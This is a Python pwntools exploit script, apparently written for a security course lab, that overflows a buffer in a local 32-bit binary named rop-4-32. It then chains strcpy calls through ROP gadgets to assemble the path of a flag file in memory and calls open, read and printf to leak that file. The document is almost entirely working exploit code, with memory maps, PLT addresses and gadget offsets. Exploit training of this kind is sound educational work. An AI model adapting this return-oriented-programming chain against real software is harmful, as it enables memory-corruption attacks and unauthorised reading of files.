#!/usr/bin/env python

from pwn import *

p = process("./rop-4-32")

buf = "A"*0x88 + "AAAA"
"""
0x8048000  0x8049000 r-xp     1000 0      /home/labs/week5/rop-4-32/rop-4-32
0x8049000  0x804a000 r--p     1000 0      /home/labs/week5/rop-4-32/rop-4-32
0x804a000  0x804b000 rw-p     1000 1000   /home/labs/week5/rop-4-32/rop-4-32

0x080483c0  read@plt
0x080483d0  printf@plt
0x08048400  open@plt

0x8048768:  "the quick brown fox jumps over the lazy dog!"
0x8048798:  "I also put this for you: 1234567890-"
0x8048795:  ""
0x80487e0:  "/"

$1 = {<text variable, no debug info>} 0x804858e <strcpy>

0x804a034
0x0804873a : pop edi ; pop ebp ; ret
0x08048739 : pop esi ; pop edi ; pop ebp ; ret
0x080485c7 : pop ebp ; ret

"""
pr = p32(0x080485c7)
ppr = p32(0x0804873a)
pppr = p32(0x08048739)

strcpy = p32(0x804858e)
gb = p32(0x804a034)

# "/
buf += strcpy
buf += ppr
buf += gb
buf += p32(0x80487e0)

# "h"
buf += strcpy
buf += ppr
buf += p32(0x804a035)
buf += p32(0x8048769)

# "o"
buf += strcpy
buf += ppr
buf += p32(0x804a036)
buf += p32(0x8048779)

# "m"
buf += strcpy
buf += ppr
buf += p32(0x804a037)
buf += p32(0x804877e)

# "e"
buf += strcpy
buf += ppr
buf += p32(0x804a038)
buf += p32(0x804876a)

# "/"
buf += strcpy
buf += ppr
buf += p32(0x804a039)
buf += p32(0x80487e0)

# "la"
buf += strcpy
buf += ppr
buf += p32(0x804a03a)
buf += p32(0x804878b)

# "b"
buf += strcpy
buf += ppr
buf += p32(0x804a03c)
buf += p32(0x8048772)

# "s"
buf += strcpy
buf += ppr
buf += p32(0x804a03d)
buf += p32(0x8048780)

# "/"
buf += strcpy
buf += ppr
buf += p32(0x804a03e)
buf += p32(0x80487e0)

# "w"
buf += strcpy
buf += ppr
buf += p32(0x804a03f)
buf += p32(0x8048775)

# "e"
buf += strcpy
buf += ppr
buf += p32(0x804a040)
buf += p32(0x804876a)

# "e"
buf += strcpy
buf += ppr
buf += p32(0x804a041)
buf += p32(0x804876a)

# "k"
buf += strcpy
buf += ppr
buf += p32(0x804a042)
buf += p32(0x8048770)

# "5"
buf += strcpy
buf += ppr
buf += p32(0x804a043)
buf += p32(0x80487b5)

# "/"
buf += strcpy
buf += ppr
buf += p32(0x804a044)
buf += p32(0x80487e0)

# "r"
# "o"
buf += strcpy
buf += ppr
buf += p32(0x804a045)
buf += p32(0x8048773)

# "p"
buf += strcpy
buf += ppr
buf += p32(0x804a047)
buf += p32(0x804877f)

# "-"
buf += strcpy
buf += ppr
buf += p32(0x804a048)
buf += p32(0x80487bb)

# "4"
buf += strcpy
buf += ppr
buf += p32(0x804a049)
buf += p32(0x80487b4)

# "-"
buf += strcpy
buf += ppr
buf += p32(0x804a04a)
buf += p32(0x80487bb)

# "3"
buf += strcpy
buf += ppr
buf += p32(0x804a04b)
buf += p32(0x80487b3)

# "2"
buf += strcpy
buf += ppr
buf += p32(0x804a04c)
buf += p32(0x80487b2)

# "/"
buf += strcpy
buf += ppr
buf += p32(0x804a04d)
buf += p32(0x80487e0)

# "f"
buf += strcpy
buf += ppr
buf += p32(0x804a04e)
buf += p32(0x8048778)

# "l"
# "a"
buf += strcpy
buf += ppr
buf += p32(0x804a04f)
buf += p32(0x804878b)

# "g"
buf += strcpy
buf += ppr
buf += p32(0x804a051)
buf += p32(0x8048792)

# "
buf += strcpy
buf += ppr
buf += p32(0x804a052)
buf += p32(0x8048794)

openn = p32(0x08048400)
read = p32(0x080483c0)
printf = p32(0x080483d0)

buf += openn
buf += pppr
buf += gb
buf += p32(0)
buf += p32(0)

buf += read
buf += pppr
buf += p32(3)
buf += p32(0x804a800)
buf += p32(100)

buf += printf
buf += pr
buf += p32(0x804a800)

p.sendline(buf)
p.interactive()
